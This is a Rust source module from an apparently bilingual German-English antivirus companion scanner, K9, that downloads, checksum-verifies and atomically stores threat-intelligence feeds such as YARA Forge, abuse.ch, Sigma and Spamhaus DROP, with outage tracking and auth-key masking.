//! Detection sources: download, verify and store signature/rule/IOC data.
//!
//! Rules for every source:
//! * HTTPS only, size limits, timeouts.
//! * Checksums are verified where the source publishes them (YARA Forge
//!   release digests, freshclam verifies ClamAV's signed databases itself).
//! * New data is written next to the old files and only swapped in after it
//!   was parsed/compiled successfully – a failed update keeps the previous set.
//! * The SHA-256 of every stored file is recorded in `status.json`; if another
//!   security product deletes or changes a file, [`Sources::integrity_warnings`]
//!   reports it clearly.

use std::collections::BTreeMap;
use std::io::Read;
use std::path::{Path, PathBuf};
use std::time::Duration;

use anyhow::{bail, Context, Result};
use chrono::{Local, NaiveDateTime};
use serde::{Deserialize, Serialize};

use crate::config::QuellenConfig;
use crate::paths::{expand_env, AppPaths};
use crate::secrets;

pub const ABUSECH_KEY: &str = "abusech-key";
pub const NVD_KEY: &str = "nvd-key";

const TS: &str = "%Y-%m-%d %H:%M:%S";
const MB: u64 = 1024 * 1024;

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum SourceId {
    YaraForge,
    MalwareBazaar,
    UrlHaus,
    ThreatFox,
    OpenPhish,
    CisaKev,
    ClamAv,
    LolDrivers,
    MsTreiber,
    MalExt,
    PhishFilter,
    Sigma,
    HageziTif,
    SpamhausDrop,
    Lolbas,
}

impl SourceId {
    pub const ALL: [SourceId; 15] = [
        SourceId::YaraForge,
        SourceId::MalwareBazaar,
        SourceId::UrlHaus,
        SourceId::ThreatFox,
        SourceId::OpenPhish,
        SourceId::CisaKev,
        SourceId::ClamAv,
        SourceId::LolDrivers,
        SourceId::MsTreiber,
        SourceId::MalExt,
        SourceId::PhishFilter,
        SourceId::Sigma,
        SourceId::HageziTif,
        SourceId::SpamhausDrop,
        SourceId::Lolbas,
    ];

    pub fn key(self) -> &'static str {
        match self {
            SourceId::YaraForge => "yara_forge",
            SourceId::MalwareBazaar => "malwarebazaar",
            SourceId::UrlHaus => "urlhaus",
            SourceId::ThreatFox => "threatfox",
            SourceId::OpenPhish => "openphish",
            SourceId::CisaKev => "cisa_kev",
            SourceId::ClamAv => "clamav",
            SourceId::LolDrivers => "loldrivers",
            SourceId::MsTreiber => "ms_treiber",
            SourceId::MalExt => "malext",
            SourceId::PhishFilter => "phishing_filter",
            SourceId::Sigma => "sigma",
            SourceId::HageziTif => "hagezi_tif",
            SourceId::SpamhausDrop => "spamhaus_drop",
            SourceId::Lolbas => "lolbas",
        }
    }

    pub fn parse(s: &str) -> Option<SourceId> {
        Self::ALL.into_iter().find(|id| id.key() == s.trim().to_lowercase())
    }

    pub fn label(self) -> &'static str {
        match self {
            SourceId::YaraForge => t!("YARA Forge (YARA-Regeln)", "YARA Forge (YARA rules)"),
            SourceId::MalwareBazaar => t!("abuse.ch MalwareBazaar (Schadsoftware-Hashes)", "abuse.ch MalwareBazaar (malware hashes)"),
            SourceId::UrlHaus => t!("abuse.ch URLhaus (Schad-Adressen)", "abuse.ch URLhaus (malicious addresses)"),
            SourceId::ThreatFox => "abuse.ch ThreatFox (IOCs)",
            SourceId::OpenPhish => t!("OpenPhish Community (Phishing-Adressen)", "OpenPhish Community (phishing addresses)"),
            SourceId::CisaKev => t!("CISA KEV (aktiv ausgenutzte Schwachstellen)", "CISA KEV (actively exploited vulnerabilities)"),
            SourceId::ClamAv => t!("ClamAV-Signaturen (freshclam)", "ClamAV signatures (freshclam)"),
            SourceId::LolDrivers => t!("LOLDrivers (verwundbare/bösartige Treiber)", "LOLDrivers (vulnerable/malicious drivers)"),
            SourceId::MsTreiber => t!("Microsoft-Sperrliste für verwundbare Treiber", "Microsoft block list for vulnerable drivers"),
            SourceId::MalExt => t!("MalExt Sentry (schädliche Browser-Erweiterungen)", "MalExt Sentry (malicious browser extensions)"),
            SourceId::PhishFilter => t!("malware-filter phishing-filter (Phishing-Domains)", "malware-filter phishing-filter (phishing domains)"),
            SourceId::Sigma => t!("SigmaHQ (Sigma-Regeln für Programmstarts)", "SigmaHQ (Sigma rules for program starts)"),
            SourceId::HageziTif => t!("HaGeZi Threat Intelligence Feeds, mittlere Liste (Schad-Domains)", "HaGeZi Threat Intelligence Feeds, medium list (malicious domains)"),
            SourceId::SpamhausDrop => t!("Spamhaus DROP (gekaperte und kriminelle Netze)", "Spamhaus DROP (hijacked and criminal networks)"),
            SourceId::Lolbas => t!("LOLBAS (missbrauchte Windows-Programme) mit den zugehörigen Sigma-Regeln", "LOLBAS (misused Windows programs) with the matching Sigma rules"),
        }
    }

    pub fn license(self) -> &'static str {
        match self {
            SourceId::YaraForge => t!("Sammlung GPL-3.0; jede Regel trägt ihre eigene Lizenz (Metadaten 'license')", "collection GPL-3.0; every rule carries its own licence (metadata 'license')"),
            SourceId::MalwareBazaar | SourceId::UrlHaus | SourceId::ThreatFox => {
                t!("abuse.ch Nutzungsbedingungen (CC0 / frei nutzbar laut abuse.ch; Auth-Key erforderlich)", "abuse.ch terms of use (CC0 / free to use according to abuse.ch; auth key required)")
            }
            SourceId::OpenPhish => t!("OpenPhish Community Feed – laut Anbieter nur für nicht-kommerzielle Nutzung", "OpenPhish Community Feed – according to the provider for non-commercial use only"),
            SourceId::CisaKev => t!("Public Domain (US-Regierung), CC0", "public domain (US government), CC0"),
            SourceId::ClamAv => t!("ClamAV-Signaturdatenbanken (Cisco Talos), Nutzung gemäß ClamAV-Lizenz", "ClamAV signature databases (Cisco Talos), use according to the ClamAV licence"),
            SourceId::LolDrivers => t!("Apache-2.0 (Projekt magicsword-io/LOLDrivers)", "Apache-2.0 (project magicsword-io/LOLDrivers)"),
            SourceId::MsTreiber => t!("Microsoft (Download Center, Microsoft Learn: Microsoft recommended driver block rules); nur lokal ausgewertet, nicht weitergegeben", "Microsoft (Download Center, Microsoft Learn: Microsoft recommended driver block rules); evaluated locally only, not passed on"),
            SourceId::MalExt => t!("„Malicious Extension Sentry“ von toborrm9 (https://github.com/toborrm9/malicious_extension_sentry), Lizenz CC BY 4.0 (https://creativecommons.org/licenses/by/4.0/); verändert: nur gültige Erweiterungs-IDs übernommen", "“Malicious Extension Sentry” by toborrm9 (https://github.com/toborrm9/malicious_extension_sentry), licence CC BY 4.0 (https://creativecommons.org/licenses/by/4.0/); changed: only valid extension IDs taken over"),
            SourceId::Sigma => t!("Sigma-Regeln von SigmaHQ (https://github.com/SigmaHQ/sigma), Detection Rule License 1.1 (https://github.com/SigmaHQ/Detection-Rule-License) – jede Meldung nennt den Autor der Regel", "Sigma rules by SigmaHQ (https://github.com/SigmaHQ/sigma), Detection Rule License 1.1 (https://github.com/SigmaHQ/Detection-Rule-License) – every finding names the author of the rule"),
            SourceId::HageziTif => t!("„Threat Intelligence Feeds“ von HaGeZi (https://github.com/hagezi/dns-blocklists), GPL-3.0; wird beim Aktualisieren geladen, nicht mit K9 ausgeliefert", "“Threat Intelligence Feeds” by HaGeZi (https://github.com/hagezi/dns-blocklists), GPL-3.0; downloaded when updating, not shipped with K9"),
            SourceId::SpamhausDrop => t!("The Spamhaus Project (https://www.spamhaus.org/drop/), kostenlos nutzbar laut https://www.spamhaus.org/drop/terms/ – Quelle: The Spamhaus Project", "The Spamhaus Project (https://www.spamhaus.org/drop/), free to use according to https://www.spamhaus.org/drop/terms/ – source: The Spamhaus Project"),
            SourceId::Lolbas => t!("Liste: LOLBAS-Projekt (https://lolbas-project.github.io), GPL-3.0 – nur zur Auswahl der Regeln gelesen, nicht mit K9 ausgeliefert; Regeln: SigmaHQ, Detection Rule License 1.1 – jede Meldung nennt den Autor der Regel", "List: LOLBAS project (https://lolbas-project.github.io), GPL-3.0 – only read to choose the rules, not shipped with K9; rules: SigmaHQ, Detection Rule License 1.1 – every finding names the author of the rule"),
            SourceId::PhishFilter => t!("„phishing-filter“ von curben/malware-filter (https://gitlab.com/malware-filter/phishing-filter), Daten CC BY-SA 4.0 (https://creativecommons.org/licenses/by-sa/4.0/), Ursprung OpenPhish, IPThreat, PhishTank; verändert: nur gültige Hostnamen, öffentliche Suffixe (Public Suffix List) entfernt", "“phishing-filter” by curben/malware-filter (https://gitlab.com/malware-filter/phishing-filter), data CC BY-SA 4.0 (https://creativecommons.org/licenses/by-sa/4.0/), origin OpenPhish, IPThreat, PhishTank; changed: only valid host names, public suffixes (Public Suffix List) removed"),
        }
    }

    pub fn url(self) -> &'static str {
        match self {
            SourceId::YaraForge => "https://github.com/YARAHQ/yara-forge/releases",
            SourceId::MalwareBazaar => "https://mb-api.abuse.ch/v2/files/exports/<AUTH-KEY>/sha256_full.txt.zip",
            SourceId::UrlHaus => "https://urlhaus-api.abuse.ch/v2/files/exports/<AUTH-KEY>/urls_online.txt",
            SourceId::ThreatFox => "https://threatfox-api.abuse.ch/v2/files/exports/<AUTH-KEY>/full.json.zip",
            SourceId::OpenPhish => "https://openphish.com/feed.txt",
            SourceId::CisaKev => "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json",
            SourceId::ClamAv => "https://database.clamav.net (über freshclam)",
            SourceId::LolDrivers => crate::treiber::LOL_URL,
            SourceId::MsTreiber => crate::treiber::MS_URL,
            SourceId::MalExt => crate::erweiterungen::MALEXT_URL,
            SourceId::PhishFilter => crate::phishing::PHISHFILTER_URL,
            SourceId::Sigma => "https://github.com/SigmaHQ/sigma/releases",
            SourceId::HageziTif => crate::sperrlisten::TIF_URL,
            SourceId::SpamhausDrop => crate::sperrlisten::DROP_URL,
            SourceId::Lolbas => LOLBAS_URL,
        }
    }

    pub fn needs_abusech_key(self) -> bool {
        matches!(self, SourceId::MalwareBazaar | SourceId::UrlHaus | SourceId::ThreatFox)
    }

    pub fn enabled(self, cfg: &QuellenConfig) -> bool {
        match self {
            SourceId::YaraForge => cfg.yara_aktiv,
            SourceId::MalwareBazaar | SourceId::UrlHaus | SourceId::ThreatFox => cfg.abusech_aktiv,
            SourceId::OpenPhish => cfg.openphish_aktiv,
            SourceId::CisaKev => cfg.cve_aktiv,
            SourceId::ClamAv => cfg.clamav_aktiv,
            SourceId::LolDrivers | SourceId::MsTreiber => cfg.treiber_aktiv,
            SourceId::MalExt => cfg.erweiterungen_aktiv,
            SourceId::PhishFilter => cfg.phishing_filter_aktiv,
            SourceId::Sigma => cfg.sigma_aktiv,
            SourceId::HageziTif => cfg.hagezi_tif_aktiv,
            SourceId::SpamhausDrop => cfg.spamhaus_drop_aktiv,
            SourceId::Lolbas => cfg.lolbas_aktiv,
        }
    }

    /// Sub folder inside the sources folder.
    pub fn folder(self) -> &'static str {
        match self {
            SourceId::YaraForge => "yara",
            SourceId::MalwareBazaar | SourceId::UrlHaus | SourceId::ThreatFox => "abusech",
            SourceId::OpenPhish => "openphish",
            SourceId::CisaKev => "kev",
            SourceId::ClamAv => "clamav",
            SourceId::LolDrivers | SourceId::MsTreiber => "treiber",
            SourceId::MalExt => "erweiterungen",
            SourceId::PhishFilter => "phishing",
            SourceId::Sigma => "sigma",
            SourceId::HageziTif => "hagezi",
            SourceId::SpamhausDrop => "spamhaus",
            SourceId::Lolbas => "lolbas",
        }
    }
}

#[derive(Debug, Clone, Default, Serialize, Deserialize, PartialEq)]
pub struct FileRecord {
    /// Path relative to the sources folder.
    pub name: String,
    pub sha256: String,
    pub size: u64,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct SourceStatus {
    pub last_update: Option<String>,
    pub last_attempt: Option<String>,
    pub version: Option<String>,
    pub entries: u64,
    pub files: Vec<FileRecord>,
    pub error: Option<String>,
    /// Failed update attempts in a row (a rate limit does not count); 0 after a success.
    #[serde(default)]
    pub failures: u32,
    /// License summary recorded at download time.
    pub license: Option<String>,
    /// Counters by type, e.g. ThreatFox `sha256`/`url`/`domain`.
    #[serde(default)]
    pub details: BTreeMap<String, u64>,
}

/// "Too many requests": the provider asks to come back later, the stored data stays valid.
pub fn rate_limited(error: &str) -> bool {
    error.contains(" 429") || error.contains("(429)")
}

/// Failed attempts in a row after which a source counts as failed.
pub const OUTAGE_FAILURES: u32 = 3;
/// ... or a state this old together with a failed last attempt.
pub const OUTAGE_DAYS: i64 = 3;

/// Why this (enabled) source counts as failed, or `None`. A rate limit is no outage, and an
/// old state alone is none either (the PC may simply have been off): the last attempt must have failed.
pub fn outage(st: &SourceStatus, now: NaiveDateTime) -> Option<String> {
    let error = st.error.as_deref()?;
    if rate_limited(error) {
        return None;
    }
    if st.failures >= OUTAGE_FAILURES {
        return Some(format!("{} Fehlversuche hintereinander, zuletzt: {error}", st.failures));
    }
    let age = st.last_update.as_deref().and_then(|u| NaiveDateTime::parse_from_str(u, TS).ok()).map(|t| now - t)?;
    (age >= chrono::Duration::days(OUTAGE_DAYS)).then(|| format!("der Stand ist {} Tage alt, letzter Fehler: {error}", age.num_days()))
}

/// `outage` for the current local time.
pub fn outage_now(st: &SourceStatus) -> Option<String> {
    outage(st, Local::now().naive_local())
}

/// Identity of one outage: a later outage of the same source (after a successful update) is a new one.
pub fn outage_episode(id: SourceId, st: &SourceStatus) -> String {
    format!("stoerung|quelle|{}|{}", id.key(), st.last_update.as_deref().unwrap_or("nie"))
}

/// The lists every file check depends on weigh more than the others.
pub fn outage_severity(id: SourceId) -> crate::model::Severity {
    match id {
        SourceId::YaraForge | SourceId::MalwareBazaar | SourceId::ThreatFox | SourceId::ClamAv => crate::model::Severity::Hoch,
        _ => crate::model::Severity::Mittel,
    }
}

/// Access to the sources folder and its `status.json`.
pub struct Sources {
    pub dir: PathBuf,
    pub status: BTreeMap<String, SourceStatus>,
}

impl Sources {
    pub fn dir_for(paths: &AppPaths, cfg: &QuellenConfig) -> PathBuf {
        // With the Windows service: protected folder, updated only by the service
        // (a folder from config.toml is then ignored – the user could not protect it).
        if let Some(dir) = crate::schutz::protected_sources().filter(|_| !paths.portable) {
            return dir;
        }
        // The service never uses source data from a user folder.
        if crate::schutz::in_service() {
            return crate::schutz::protected_dir().join("quellen");
        }
        if cfg.ordner.trim().is_empty() {
            paths.data_dir.join("quellen")
        } else {
            PathBuf::from(expand_env(cfg.ordner.trim()))
        }
    }

    pub fn open(paths: &AppPaths, cfg: &QuellenConfig) -> Result<Self> {
        Self::open_dir(Self::dir_for(paths, cfg))
    }

    pub fn open_dir(dir: PathBuf) -> Result<Self> {
        if !dir.is_dir() && !crate::schutz::in_service() {
            std::fs::create_dir_all(&dir).with_context(|| format!("{} kann nicht angelegt werden", dir.display()))?;
        }
        let status = std::fs::read_to_string(dir.join("status.json"))
            .ok()
            .and_then(|t| serde_json::from_str(&t).ok())
            .unwrap_or_default();
        Ok(Self { dir, status })
    }

    pub fn save(&self) -> Result<()> {
        let tmp = self.dir.join("status.json.tmp");
        std::fs::write(&tmp, serde_json::to_vec_pretty(&self.status)?)?;
        std::fs::rename(&tmp, self.dir.join("status.json"))?;
        Ok(())
    }

    pub fn get(&self, id: SourceId) -> SourceStatus {
        self.status.get(id.key()).cloned().unwrap_or_default()
    }

    pub fn path(&self, rel: &str) -> PathBuf {
        self.dir.join(rel)
    }

    /// True if the source was never updated or its interval is over.
    pub fn is_due(&self, id: SourceId, cfg: &QuellenConfig, now: NaiveDateTime) -> bool {
        // MalwareBazaar: every hour the small list of the newest samples (the complete list
        // once a day, see `update_malwarebazaar`) – malware of today is in it within the hour.
        let default = if id == SourceId::MalwareBazaar { 1 } else { cfg.aktualisieren_stunden };
        let hours = cfg.intervall_stunden.get(id.key()).copied().unwrap_or(default).max(1);
        let st = self.get(id);
        // After a failed attempt wait at least 1 h before retrying.
        let last = match (&st.last_update, &st.last_attempt) {
            (_, Some(a)) if st.error.is_some() => {
                return NaiveDateTime::parse_from_str(a, TS).map(|t| now - t >= chrono::Duration::hours(1)).unwrap_or(true)
            }
            (Some(u), _) => u,
            (None, _) => return true,
        };
        NaiveDateTime::parse_from_str(last, TS)
            .map(|t| now - t >= chrono::Duration::hours(hours as i64))
            .unwrap_or(true)
    }

    /// Files recorded at update time that are now missing or changed –
    /// typically removed by another antivirus product.
    pub fn integrity_warnings(&self) -> Vec<String> {
        let mut out = Vec::new();
        for id in SourceId::ALL {
            for f in &self.get(id).files {
                let p = self.dir.join(&f.name);
                match crate::scanner::sha256_file(&p) {
                    Err(_) => out.push(format!(
                        "{}: Datei {} fehlt – vermutlich von einem anderen Virenschutz gelöscht. Bitte Ordner {} dort als Ausnahme eintragen und 'k9 quellen aktualisieren' ausführen.",
                        id.label(),
                        f.name,
                        self.dir.display()
                    )),
                    Ok(sha) if sha != f.sha256 => out.push(format!(
                        "{}: Datei {} wurde verändert (Prüfsumme stimmt nicht) – bitte 'k9 quellen aktualisieren' ausführen.",
                        id.label(),
                        f.name
                    )),
                    Ok(_) => {}
                }
            }
        }
        out
    }

    /// Stable fingerprint of all loaded signature states (for the scan cache).
    pub fn state_fingerprint(&self) -> String {
        let mut s = String::new();
        for id in SourceId::ALL {
            let st = self.get(id);
            for f in &st.files {
                s.push_str(&f.sha256);
            }
        }
        crate::sha256_hex(s.as_bytes())[..16].to_string()
    }

    /// Updates one source. On error the previous files stay untouched.
    pub fn update(&mut self, id: SourceId, cfg: &QuellenConfig) -> Result<String> {
        let now = Local::now().format(TS).to_string();
        let res = match id {
            SourceId::YaraForge => update_yara_forge(&self.dir, cfg),
            SourceId::MalwareBazaar => update_malwarebazaar(&self.dir),
            SourceId::UrlHaus => update_urlhaus(&self.dir),
            SourceId::ThreatFox => update_threatfox(&self.dir),
            SourceId::OpenPhish => update_openphish(&self.dir),
            SourceId::CisaKev => update_kev(&self.dir),
            SourceId::ClamAv => crate::clamav::update(&self.dir, cfg),
            SourceId::LolDrivers => update_loldrivers(&self.dir),
            SourceId::MsTreiber => update_ms_treiber(&self.dir),
            SourceId::MalExt => update_malext(&self.dir),
            SourceId::PhishFilter => update_phishfilter(&self.dir),
            SourceId::Sigma => update_sigma(&self.dir),
            SourceId::HageziTif => update_hagezi_tif(&self.dir),
            SourceId::SpamhausDrop => update_spamhaus_drop(&self.dir),
            SourceId::Lolbas => update_lolbas(&self.dir),
        };
        let st = self.status.entry(id.key().to_string()).or_default();
        st.last_attempt = Some(now.clone());
        let msg = match res {
            Ok(u) => {
                st.last_update = Some(now);
                st.version = Some(u.version.clone());
                st.entries = u.entries;
                st.files = u.files;
                st.error = None;
                st.failures = 0;
                st.license = Some(u.license.unwrap_or_else(|| id.license().to_string()));
                st.details = u.details;
                Ok(format!("{}: aktualisiert (Stand {}, {} Einträge)", id.label(), u.version, u.entries))
            }
            Err(e) => {
                let text = format!("{e:#}");
                if !rate_limited(&text) {
                    st.failures = st.failures.saturating_add(1);
                }
                st.error = Some(text);
                Err(e)
            }
        };
        self.save()?;
        msg
    }
}

/// Result of a successful source update.
#[derive(Default)]
pub struct Update {
    pub version: String,
    pub entries: u64,
    pub files: Vec<FileRecord>,
    pub license: Option<String>,
    pub details: BTreeMap<String, u64>,
}

pub fn record(dir: &Path, rel: &str) -> Result<FileRecord> {
    let p = dir.join(rel);
    let sha = crate::scanner::sha256_file(&p)?;
    Ok(FileRecord { name: rel.replace('\\', "/"), sha256: sha, size: std::fs::metadata(&p)?.len() })
}

/// Writes `data` to `dir/rel` via a temporary file and atomic rename.
pub fn write_atomic(dir: &Path, rel: &str, data: &[u8]) -> Result<()> {
    let target = dir.join(rel);
    if let Some(parent) = target.parent() {
        std::fs::create_dir_all(parent)?;
    }
    let tmp = target.with_extension("neu");
    std::fs::write(&tmp, data)?;
    std::fs::rename(&tmp, &target).with_context(|| format!("{} kann nicht ersetzt werden", target.display()))?;
    Ok(())
}

pub fn http() -> Result<reqwest::blocking::Client> {
    Ok(reqwest::blocking::Client::builder()
        .https_only(true)
        .timeout(Duration::from_secs(300))
        .connect_timeout(Duration::from_secs(20))
        .user_agent(concat!("K9/", env!("CARGO_PKG_VERSION"), " (lokaler Begleitscanner)"))
        .build()?)
}

/// GET with size limit. `headers` e.g. the abuse.ch Auth-Key.
pub fn download(url: &str, headers: &[(&str, String)], max_bytes: u64) -> Result<Vec<u8>> {
    if !url.starts_with("https://") {
        bail!("Nur HTTPS erlaubt: {url}");
    }
    let mut req = http()?.get(url);
    for (k, v) in headers {
        req = req.header(*k, v);
    }
    let resp = req.send().with_context(|| format!("{url} nicht erreichbar"))?;
    let status = resp.status();
    if status.as_u16() == 401 || status.as_u16() == 403 || status.as_u16() == 410 {
        bail!("{url}: Zugriff verweigert ({status}) – Auth-Key fehlt oder ist ungültig");
    }
    if status.as_u16() == 429 {
        bail!("{url}: zu viele Abrufe (429) – der bisherige Stand bleibt aktiv, neuer Versuch beim nächsten Intervall");
    }
    if !status.is_success() {
        bail!("{url}: Server antwortet mit {status}");
    }
    let mut buf = Vec::new();
    resp.take(max_bytes + 1).read_to_end(&mut buf)?;
    if buf.len() as u64 > max_bytes {
        bail!("{url}: Antwort größer als {} MB – abgebrochen", max_bytes / MB);
    }
    Ok(buf)
}

/// Downloads an abuse.ch export (API v2: the Auth-Key is part of the URL path,
/// e.g. `https://mb-api.abuse.ch/v2/files/exports/<KEY>/sha256_full.txt.zip`).
/// The key is masked in every error message, log line and status entry.
fn abusech_download(host: &str, file: &str, max_bytes: u64) -> Result<Vec<u8>> {
    let key = secrets::get(ABUSECH_KEY)?.context(
        "abuse.ch Auth-Key fehlt – kostenlos registrieren unter https://auth.abuse.ch/ und mit 'k9 geheimnis abusech-key' hinterlegen",
    )?;
    let key = key.trim();
    if key.is_empty() || !key.chars().all(|c| c.is_ascii_alphanumeric()) {
        bail!("abuse.ch Auth-Key hat ein ungültiges Format – bitte mit 'k9 geheimnis abusech-key' neu hinterlegen");
    }
    let url = format!("https://{host}/v2/files/exports/{key}/{file}");
    download(&url, &[], max_bytes).map_err(|e| anyhow::anyhow!("{}", mask(&format!("{e:#}"), key)))
}

fn mask(text: &str, secret: &str) -> String {
    text.replace(secret, "<AUTH-KEY>")
}

/// First file in a ZIP archive whose name matches `pred`.
pub fn unzip_entry(data: &[u8], pred: impl Fn(&str) -> bool, max_bytes: u64) -> Result<(String, Vec<u8>)> {
    let mut zip = zip::ZipArchive::new(std::io::Cursor::new(data)).context("Ungültiges ZIP-Archiv")?;
    for i in 0..zip.len() {
        let mut f = zip.by_index(i)?;
        let name = f.name().map(|n| n.to_string()).unwrap_or_default();
        if f.is_file() && pred(&name) {
            if f.size() > max_bytes {
                bail!("{name} ist zu groß");
            }
            let mut out = Vec::with_capacity(f.size() as usize);
            f.by_ref().take(max_bytes + 1).read_to_end(&mut out)?;
            return Ok((name, out));
        }
    }
    bail!("Erwartete Datei nicht im ZIP-Archiv gefunden")
}

fn today() -> String {
    Local::now().format("%Y-%m-%d").to_string()
}

// ------------------------------------------------------------------ YARA Forge

pub const YARA_RULES_FILE: &str = "yara/regeln.yar";
pub const YARA_COMPILED_FILE: &str = "yara/regeln.kompiliert";

fn update_yara_forge(dir: &Path, cfg: &QuellenConfig) -> Result<Update> {
    let paket = match cfg.yara_paket.trim().to_lowercase().as_str() {
        "extended" => "extended",
        _ if cfg.yara_erweitert => "extended",
        _ => "core",
    };
    let api = download("https://api.github.com/repos/YARAHQ/yara-forge/releases/latest", &[], 5 * MB)?;
    let release: serde_json::Value = serde_json::from_slice(&api).context("GitHub-Antwort ungültig")?;
    note_new_packages(dir, "YARA Forge", &release, KNOWN_YARA_PACKAGES);
    let tag = release["tag_name"].as_str().unwrap_or("unbekannt").to_string();
    let wanted = format!("yara-forge-rules-{paket}.zip");
    let asset = release["assets"]
        .as_array()
        .and_then(|a| a.iter().find(|x| x["name"].as_str() == Some(wanted.as_str())))
        .with_context(|| format!("{wanted} nicht im Release {tag}"))?;
    let url = asset["browser_download_url"].as_str().context("Download-Adresse fehlt")?;
    let zip = download(url, &[], 100 * MB)?;
    match asset["digest"].as_str().and_then(|d| d.strip_prefix("sha256:")) {
        Some(expected) => {
            let actual = crate::sha256_hex(&zip);
            if !actual.eq_ignore_ascii_case(expected) {
                bail!("Prüfsumme von {wanted} stimmt nicht (erwartet {expected}, erhalten {actual})");
            }
        }
        None => tracing::warn!("YARA Forge: keine Prüfsumme im Release veröffentlicht"),
    }
    let (_, rules) = unzip_entry(&zip, |n| n.ends_with(".yar"), 200 * MB)?;
    let source = String::from_utf8(rules).context("Regeldatei ist kein UTF-8")?;
    // Compile before replacing anything – broken rules keep the old set.
    let compiled = crate::yara::compile(&source)?;
    let count = compiled.count;
    write_atomic(dir, YARA_RULES_FILE, source.as_bytes())?;
    write_atomic(dir, YARA_COMPILED_FILE, &compiled.bytes)?;
    Ok(Update {
        version: format!("{tag} ({paket})"),
        entries: count as u64,
        files: vec![record(dir, YARA_RULES_FILE)?, record(dir, YARA_COMPILED_FILE)?],
        license: Some(format!("{} | Regel-Lizenzen: {}", SourceId::YaraForge.license(), license_summary(&source))),
        ..Default::default()
    })
}

/// HaGeZi "Threat Intelligence Feeds", medium version: stored as sorted 64-bit keys.
fn update_hagezi_tif(dir: &Path) -> Result<Update> {
    let data = download(crate::sperrlisten::TIF_URL, &[], 100 * MB)?;
    let (version, keys) = crate::sperrlisten::parse_tif(&String::from_utf8_lossy(&data));
    if keys.len() < 50_000 {
        bail!("HaGeZi-Liste unerwartet klein ({} Einträge) – nicht übernommen", keys.len());
    }
    write_atomic(dir, crate::sperrlisten::TIF_FILE, &crate::sperrlisten::encode_keys(&keys))?;
    Ok(Update {
        version: if version.is_empty() { Local::now().format(TS).to_string() } else { version },
        entries: keys.len() as u64,
        files: vec![record(dir, crate::sperrlisten::TIF_FILE)?],
        license: Some(SourceId::HageziTif.license().to_string()),
        ..Default::default()
    })
}

/// Spamhaus DROP: kept as published (the file carries Spamhaus' copyright line).
fn update_spamhaus_drop(dir: &Path) -> Result<Update> {
    let data = download(crate::sperrlisten::DROP_URL, &[], 10 * MB)?;
    let (ranges, stamp) = crate::sperrlisten::parse_drop(&String::from_utf8_lossy(&data))?;
    if ranges.len() < 100 {
        bail!("Spamhaus DROP unerwartet klein ({} Netze) – nicht übernommen", ranges.len());
    }
    write_atomic(dir, crate::sperrlisten::DROP_FILE, &data)?;
    let version = chrono::DateTime::from_timestamp(stamp, 0).map(|t| t.with_timezone(&Local).format(TS).to_string()).unwrap_or_else(|| Local::now().format(TS).to_string());
    Ok(Update {
        version,
        entries: ranges.len() as u64,
        files: vec![record(dir, crate::sperrlisten::DROP_FILE)?],
        license: Some(SourceId::SpamhausDrop.license().to_string()),
        ..Default::default()
    })
}

/// Sigma rules: the package "core" of the latest SigmaHQ release (rules of the levels high and
/// critical with status test or stable). Kept as the published archive; only the rules for
/// Windows process starts are used (`crate::sigma`).
fn update_sigma(dir: &Path) -> Result<Update> {
    const WANTED: &str = "sigma_core.zip";
    let api = download("https://api.github.com/repos/SigmaHQ/sigma/releases/latest", &[], 5 * MB)?;
    let release: serde_json::Value = serde_json::from_slice(&api).context("GitHub-Antwort ungültig")?;
    note_new_packages(dir, "SigmaHQ", &release, KNOWN_SIGMA_PACKAGES);
    let tag = release["tag_name"].as_str().unwrap_or("unbekannt").to_string();
    let asset = release["assets"]
        .as_array()
        .and_then(|a| a.iter().find(|x| x["name"].as_str() == Some(WANTED)))
        .with_context(|| format!("{WANTED} nicht im Release {tag}"))?;
    let url = asset["browser_download_url"].as_str().context("Download-Adresse fehlt")?;
    let zip = download(url, &[], 20 * MB)?;
    match asset["digest"].as_str().and_then(|d| d.strip_prefix("sha256:")) {
        Some(expected) => {
            let actual = crate::sha256_hex(&zip);
            if !actual.eq_ignore_ascii_case(expected) {
                bail!("Prüfsumme von {WANTED} stimmt nicht (erwartet {expected}, erhalten {actual})");
            }
        }
        None => tracing::warn!("Sigma: keine Prüfsumme im Release veröffentlicht"),
    }
    // The add-on "Emerging Threats" of the same release (rules for current attack waves). Its
    // absence or a broken download is no reason to keep the main package back.
    const ADDON: &str = "sigma_emerging_threats_addon.zip";
    let addon = release["assets"].as_array().and_then(|a| a.iter().find(|x| x["name"].as_str() == Some(ADDON))).and_then(|asset| {
        let data = download(asset["browser_download_url"].as_str()?, &[], 20 * MB).ok()?;
        match asset["digest"].as_str().and_then(|d| d.strip_prefix("sha256:")) {
            Some(expected) if !crate::sha256_hex(&data).eq_ignore_ascii_case(expected) => {
                tracing::warn!("Sigma: Prüfsumme von {ADDON} stimmt nicht – Zusatzpaket wird ausgelassen");
                None
            }
            _ => Some(data),
        }
    });
    // Read the rules before replacing anything – a broken package keeps the old one.
    let set = crate::sigma::RuleSet::from_packages(&zip, addon.as_deref())?;
    if set.rules.is_empty() {
        bail!("Sigma-Paket {tag}: keine auswertbare Regel");
    }
    write_atomic(dir, crate::sigma::PACKAGE_FILE, &zip)?;
    let mut files = vec![record(dir, crate::sigma::PACKAGE_FILE)?];
    if let Some(a) = &addon {
        write_atomic(dir, crate::sigma::ADDON_FILE, a)?;
        files.push(record(dir, crate::sigma::ADDON_FILE)?);
    }
    Ok(Update {
        version: format!(
            "{tag} (core{}, {} Regeln für Programmstarts, davon {} aus dem Zusatzpaket und {} mit den Angaben von K9 nie auslösbar; {} nicht auswertbar)",
            if addon.is_some() { " und Emerging Threats" } else { "" },
            set.rules.len(),
            set.addon,
            set.dormant,
            set.skipped
        ),
        entries: set.rules.len() as u64,
        files,
        license: Some(SourceId::Sigma.license().to_string()),
        ..Default::default()
    })
}

/// The packages of a release K9 knows about (used or deliberately not used). A name that is
/// not in the list is a package that appeared since K9 was built – worth a look by a human;
/// K9 never starts using a new source by itself.
pub const KNOWN_SIGMA_PACKAGES: &[&str] = &["sigma_all_rules.zip", "sigma_core++.zip", "sigma_core+.zip", "sigma_core.zip", "sigma_emerging_threats_addon.zip"];
pub const KNOWN_YARA_PACKAGES: &[&str] = &["yara-forge-log.txt", "yara-forge-rule-issues.yml", "yara-forge-rules-core.zip", "yara-forge-rules-extended.zip", "yara-forge-rules-full.zip"];
/// Where new package names are remembered until the service has reported them.
